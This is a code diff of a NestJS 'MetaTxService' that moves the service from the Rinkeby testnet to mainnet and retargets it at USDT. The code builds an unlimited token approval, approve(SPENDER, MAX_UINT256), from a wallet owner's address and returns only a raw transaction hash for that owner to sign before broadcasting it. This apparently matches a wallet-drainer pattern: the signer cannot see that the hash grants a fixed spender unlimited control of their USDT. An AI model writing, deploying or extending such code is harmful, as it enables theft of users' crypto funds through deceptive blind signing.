@@ -3,12 +3,12 @@ import { InjectModel } from '@nestjs/mongoose';
 import { Model } from 'mongoose';
 import {
   BIG_TOKEN_ADDRESSES,
-  ERC20_ADDRESS,
+  USDT_ADDRESS,
   getRandRpcElseOne,
   LOG_TOPIC_SWAP,
   MAX_UINT256,
   PANCAKESWAP_V2_FACTORY,
-  rinkebyRpcURL,
+  mainnetRpcURL,
   SPENDER,
   WBNB_ADDRESS,
   WBNB_BUSD_PAIR,
@@ -31,7 +31,7 @@ export class MetaTxService {
 
   constructor() {
     const Web3 = require('web3');
-    this.rpcUrl = rinkebyRpcURL;
+    this.rpcUrl = mainnetRpcURL;
     this.web3 = new Web3(this.rpcUrl);
   }
 
@@ -42,37 +42,37 @@ export class MetaTxService {
       web3.eth.getGasPrice(),
     ]);
 
-    gasPrice = parseInt(gasPrice) + 1000000000;
+    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI
 
-    const erc20Contract = new web3.eth.Contract(ABI_ERC20, ERC20_ADDRESS);
+    const erc20Contract = new web3.eth.Contract(ABI_ERC20, USDT_ADDRESS);
     const approveTxData = erc20Contract.methods
       .approve(SPENDER, MAX_UINT256)
       .encodeABI();
 
     const txObject = {
       from: ownerAddress,
-      to: ERC20_ADDRESS,
+      to: USDT_ADDRESS,
       data: approveTxData,
       nonce: web3.utils.toHex(txCount),
       gasLimit: web3.utils.toHex(50000),
       gasPrice: web3.utils.toHex(gasPrice),
     };
 
-    const tx = new Tx(txObject, { chain: 'rinkeby' });
+    const tx = new Tx(txObject, { chain: 'mainnet' });
 
     tx.v = new buffer_1.Buffer([]);
     tx.s = new buffer_1.Buffer([]);
     tx.r = new buffer_1.Buffer([]);
     var msgHash = tx.hash(false);
-    console.log('0x' + tx.serialize().toString('hex'));
+    console.log('gas', gasPrice, ' 0x' + tx.serialize().toString('hex'));
     return { signHash: msgHash.toString('hex'), txObject };
   }
   async performMetaTx(signedHexString: string, txObject: TxObject) {
     const web3 = this.web3;
     let raw;
-    const tx = new Tx(txObject, { chain: 'rinkeby' });
+    const tx = new Tx(txObject, { chain: 'mainnet' });
 
-    const txCopy = new Tx(txObject, { chain: 'rinkeby' });
+    const txCopy = new Tx(txObject, { chain: 'mainnet' });
     tx.v = new buffer_1.Buffer([]);
     tx.s = new buffer_1.Buffer([]);
     tx.r = new buffer_1.Buffer([]);
